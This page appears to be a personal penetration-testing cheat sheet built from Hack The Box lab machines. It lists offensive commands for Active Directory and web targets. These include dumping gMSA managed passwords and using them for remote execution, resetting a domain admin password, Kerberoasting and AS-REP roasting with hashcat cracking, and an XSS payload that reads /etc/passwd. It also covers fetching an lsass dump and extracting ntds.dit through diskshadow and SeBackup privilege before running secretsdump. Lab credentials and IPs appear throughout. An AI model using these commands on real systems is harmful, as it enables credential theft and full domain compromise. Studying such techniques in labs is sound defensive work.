---
title: "cheatsheets"
layout: categories
permalink: /cheatsheet/
---

## GMSA from powershell

```
$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

#make the password into variable
$c = ConvertFrom-ADManagedPasswordBlob $mp
```

## Change password from powershell
```
$username ="BIR-ADFS-GMSA";
$password = $c.SecureCurrentPassword; 
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $password;
Invoke-Command -ScriptBlock { whoami } -ComputerName RESEARCH -Credential $cred
```

## Change domain admins password

```
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {net user Tristan.Davies bunnys666 /domain}
```

## Service Principal Names

```
GetUserSPNs.py search.htb/hope.sharp:'IsolationIsKey?' -request -dc-ip 10.10.11.129 -outputfile hash
```

## AS-REP Roasting

```
GetNPUsers.py BLACKFIELD.local/ -usersfile usernames.txt -format hashcat -dc-ip 10.10.10.192 -outputfile AS-REP
```
### Hashcat

```
hashcat -m 18200 -a 0 AS-REP ~/Desktop/htb-tool/rockyou.txt
```


## Bloodhound

### Bloodhound.py

```
./bloodhound.py -d search.htb -u hope.sharp -p 'IsolationIsKey?' -ns 10.10.11.129 -c all
```

## XSS passwd file

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

## LDAP Naming Context

```
ldapsearch -x -h $ip -D '' -w '' -b "DC=cascade,DC=local" > ldap.log
```

## Deleted Object AD

```
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```

### Deleted information object AD

```
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

## SMB Get file

```
smbget -R smb://audit2020:'Password123'@10.10.10.192/forensic/memory_analysis/lsass.zip
```

## Disk Shadow

```
set context persistent nowriters  
set metadata c:\windows\system32\spool\drivers\color\example.cab  
set verbose on  
begin backup  
add volume c: alias mydrive  
 
create  
  
expose %mydrive% w:  
end backup  
```

## SeBackup Privilege Enabled

```
#evil-winrm
upload SeBackupPrivilegeUtils.dll
upload SeBackupPrivilegeCmdLets.dll

# import module cmdlets command
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\temp\ntds.dit -Overwrite
reg save HKLM\SYSTEM c:\temp\

secretsdump.py -ntds ntds.dit -system system -just-dc LOCAL 
```

## DNS Enumeration

```
dnsenum --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt realcorp.htb -u z -v
```

## Keytab Kerberos

```
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
```